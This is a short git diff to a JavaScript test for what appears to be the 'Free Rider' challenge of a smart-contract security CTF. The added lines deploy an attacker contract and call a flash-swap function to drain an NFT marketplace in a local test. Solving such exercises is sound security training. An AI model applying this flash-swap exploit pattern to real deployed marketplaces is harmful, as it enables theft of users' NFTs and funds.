@@ -105,6 +105,11 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.freeRideAttack = await (await ethers.getContractFactory('FreeRideAttack', attacker)).deploy(this.weth.address,
+            this.uniswapFactory.address, this.marketplace.address,this.buyerContract.address);
+        await this.freeRideAttack.connect(attacker).useFlashSwap(this.token.address,ethers.utils.parseEther("15"),this.nft.address)
+
+
     });
 
     after(async function () {
